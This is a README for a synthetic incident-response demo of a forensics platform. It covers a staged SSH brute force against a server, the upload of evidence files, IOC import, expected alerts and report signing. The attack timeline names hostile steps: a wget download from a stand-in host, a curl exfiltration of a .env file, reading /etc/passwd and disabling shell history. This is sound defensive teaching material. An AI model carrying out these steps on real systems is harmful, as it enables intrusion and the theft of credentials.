# Demo evidence: "web01" server compromise

Synthetic evidence for a live demonstration of dfirbench. You upload the files through the normal
UI, so the audience sees the real pipeline: hashing, the custody chain, parsing, detection, the
timeline, AI assistance and a signed report. Nothing is pre-loaded or faked.

> Everything here is invented. Addresses come from the documentation ranges (RFC 5737:
> `198.51.100.0/24`, `203.0.113.0/24`) and private `10.0.0.0/8`, domains use the reserved
> `.example` TLD, and no real person, host or organisation is involved. No file is executable
> malware: `dropper.sh` only contains `echo` lines and a harmless encoded PowerShell command
> (`Get-Process | Select-Object -First 5`).

## The story

On **14 September 2026** (all times UTC) an attacker at `203.0.113.45` attacks the Ubuntu web
server `web01` (`10.20.0.15`):

| Time | What happens | Seen in |
|---|---|---|
| 01:30 | The real admin logs in from `10.20.0.5` and restarts nginx (normal activity) | `auth.log` |
| 02:10-02:13 | 24 SSH password guesses against `root`, `admin`, `ubuntu`, `deploy`, `test`, `oracle` | `auth.log` |
| 02:14:05 | The password of `deploy` works; `sudo /bin/bash` follows | `auth.log` |
| 02:15-02:18 | Recon (`id`, `uname -a`, `cat /etc/passwd`, `ss -tlnp`), then `wget http://cdn-update.example/x.sh` | `.bash_history`, `capture.pcap` (DNS + HTTP) |
| 02:21 | Backdoor account `backupsvc` created and added to `sudo` | `auth.log`, `.bash_history` |
| 02:25 | Cron job runs `/tmp/.x.sh` every 10 minutes | `.bash_history`, `capture.pcap` (02:50 and 03:00 call-backs) |
| 02:31-02:34 | `/var/www/app/.env` and the config folder are archived and uploaded with `curl` to `files.exfil-drop.example` (`198.51.100.23`, about 56 KB over TLS) | `.bash_history`, `capture.pcap` (DNS + TLS SNI) |
| 02:34 | `unset HISTFILE` (the attacker stops history recording) | `.bash_history` |
| 02:40 | Direct root login over SSH from the same address | `auth.log` |

## Files (`evidence/`)

| File | Upload as kind | Parser (auto) | What it shows |
|---|---|---|---|
| `iocs.csv` | not evidence: import it as IOCs | - | Attacker and exfiltration IPs, both domains, SHA-256 of `dropper.sh` |
| `auth.log` | `log` | `linux_auth` | SSH brute force, the successful login, sudo, the new account, the root login |
| `.bash_history` | `log` | `shell_history` | Every attacker command with its time (`#<epoch>` lines) |
| `capture.pcap` | `pcap` | `pcap` | DNS lookups, the HTTP download, the TLS upload with its SNI, the cron call-backs |
| `dropper.sh` | `file` | `yara_scan` (explicit) | YARA rule `PowerShell_Encoded_Download`; paste it into the AI script explainer |

Regenerate them with `backend/.venv/Scripts/python data/demo/make_demo.py` (Linux/macOS:
`backend/.venv/bin/python`). The output is deterministic, so the hashes stay the same.

## Rehearse first (2 minutes)

With the stack running, this script loads the same files into a fresh case and checks the
expected alerts. Run it before a demo to make sure nothing has changed:

```bash
DFIR_ADMIN_PASSWORD='<admin password>' backend/.venv/Scripts/python scripts/demo-check.py --admin-email <admin e-mail>
```

It ends with `DEMO CHECK PASSED` and a link to the case it created. Add `--reports-out <dir>` to
also sign the three sample reports and save their PDFs (that is how `docs/samples/` was made).

## Live walkthrough

### 0. Before the audience arrives

1. Start the stack with the offline AI provider (no API key, no internet needed):

   ```bash
   ENABLE_AI=true LLM_PROVIDER=fake docker compose -f infra/compose.yaml up -d
   bash scripts/wait-healthy.sh
   ```

   For real model answers, set `LLM_PROVIDER=anthropic` and `LLM_API_KEY=<key>` in `.env`
   instead (see `docs/admin-guide.md`). The `fake` provider returns short template answers that
   still pass schema and citation validation.
2. Create an admin if there is none, then two more users through the API docs at
   <http://127.0.0.1:8000/api/v1/docs> (`POST /users`): an **analyst** and a **lead**. Report
   approval needs a second person (four eyes), so you need both. `docs/admin-guide.md` shows the
   commands.
3. Sign in at <http://127.0.0.1:8080> as the analyst in one browser window and as the lead in a
   private window.

### 1. Create the case (lead)

**Cases**, then **Create a case**: title `Web server compromise`, severity **high**. Open the case and
add the analyst as a member (API docs: `POST /cases/{case_id}/members`
`{"user_id": "<analyst id>", "role": "analyst"}`, or create the case as the analyst instead).

### 2. Import the IOCs (before any evidence)

There is no IOC screen in the UI yet, so use the API docs: sign in with `POST /auth/login`, click
**Authorize** and paste the `access_token`, then call `POST /cases/{case_id}/iocs/import` with:

```json
{"format": "csv", "content": "type,value,source,confidence\nip,203.0.113.45,demo: SSH brute force and dropper host,0.9\nip,198.51.100.23,demo: exfiltration endpoint,0.9\ndomain,cdn-update.example,demo: dropper download host,0.6\ndomain,files.exfil-drop.example,demo: exfiltration host,0.6\nsha256,17709153986a80ed587d9c4fe2c8616a101e9885d70f672fae58193b5e116524,demo: dropper script /tmp/.x.sh,0.9\n"}
```

The answer should say `"created": 5`. Import them first: detection runs after every parse job, so
indicators that exist before the uploads are matched straight away.

### 3. Upload and process the evidence (analyst)

In **Evidence & custody**, for each of `auth.log` (kind `log`), `.bash_history` (`log`) and
`capture.pcap` (`pcap`): **Choose File**, pick the kind, **Upload**, then **Process**. Point out:

* the SHA-256 shown as soon as the upload finishes (computed while streaming into the vault);
* **Custody**: the signed, hash-chained entries (`created`, `ingested`, then `processed` after parsing); **Verify**
  re-hashes the stored original and appends a `hash_verified` entry;
* the **Jobs** list: one parse job per file, then a detection run.

Upload `dropper.sh` as kind `file` too, but do not press **Process**: no automatic parser handles a
shell script, and the UI would say so. To run YARA on it, use the API docs:
`POST /evidence/{evidence_id}/process` with `{"parsers": ["yara_scan"]}`.

### 4. Investigate

| Tab | Show | Expected |
|---|---|---|
| **Overview** | Risk, counts, top hosts and users | 4 evidence items, about 96 events, 10 alerts, host `web01` |
| **Timeline** | Query `ip:203.0.113.45`; then `event_code:ssh_failed`; then `source_type:shell_history`; click a row for the raw record, context and bookmark | 50 events involve the attacker address; the histogram shows the 02:10 burst |
| **Alerts** | Open **SSH success after failures**, then **Explain with AI**; click a citation (E1), then its link, to jump to the event | 10 alerts (table below) |
| **ATT&CK** | The heatmap | T1110 (credential access), T1078, T1098, T1136.001 |
| **Entities & graph** | Click `203.0.113.45` or `backupsvc` | Links between host, users, processes and addresses |
| **AI analyst** | Chat: *What did the attacker do on web01?*; plain-language search: *failed ssh logins from 203.0.113.45* (shows the generated query); script explanation: paste the `powershell.exe ... -enc ...` line from `dropper.sh` | Every answer is labelled AI-generated with validated citations; the script explainer shows the decoded command |
| **Response** | Start **PB-CREDENTIAL-01** with the alert id of *SSH success after failures*; try an approval step | Impactful steps need a second person; agent actions are recorded as **not executed** |
| **Notes & bookmarks** | Add a note, bookmark an event | Note history is kept |

Expected alerts:

| Alert | Rule | Level |
|---|---|---|
| SSH brute force | DFIR-LNX-0001 | medium |
| SSH success after failures | DFIR-LNX-0002 | high |
| Root login over SSH | DFIR-LNX-0003 | high |
| New Linux user created | DFIR-LNX-0004 | medium |
| Linux user added to a privileged group | DFIR-LNX-0011 | high |
| IOC match: ip 203.0.113.45 (two alerts: `auth.log` events and capture flows) | DFIR-IOC-0001 | high |
| IOC match: ip 198.51.100.23 | DFIR-IOC-0001 | high |
| IOC match: domain cdn-update.example | DFIR-IOC-0001 | high |
| IOC match: domain files.exfil-drop.example | DFIR-IOC-0001 | high |

The `sha256` indicator does not alert: no event carries the hash of `dropper.sh` (the YARA event
records the rule match). It still appears in the report's IOC list and STIX export.

### 5. Report (analyst, then lead)

1. **Reports**, then **Create report** (kind *Technical incident report*). This freezes a snapshot
   of the case.
2. Fill in the required sections (marked `*`), add a finding that cites the
   *SSH success after failures* alert, then **Run QA** and **Submit for review**.
3. As the lead: **Approve**, then **Sign**. Then **Verify**: the server checks the manifest hash,
   the Ed25519 signature, every artifact hash and that a re-render gives identical bytes.
4. Download the **PDF** (and STIX, CSV, timeline). Ready-made examples are in
   [`docs/samples/`](../../docs/samples/).

## Notes

* Process `dropper.sh` with YARA and it gets the upload time as its event time (a matched file
  has no time of its own; the event is tagged `time_inferred`). That is why the case's timeline
  span ends on the upload day.
* The files are small on purpose: the whole walkthrough runs in under 10 minutes on a laptop.
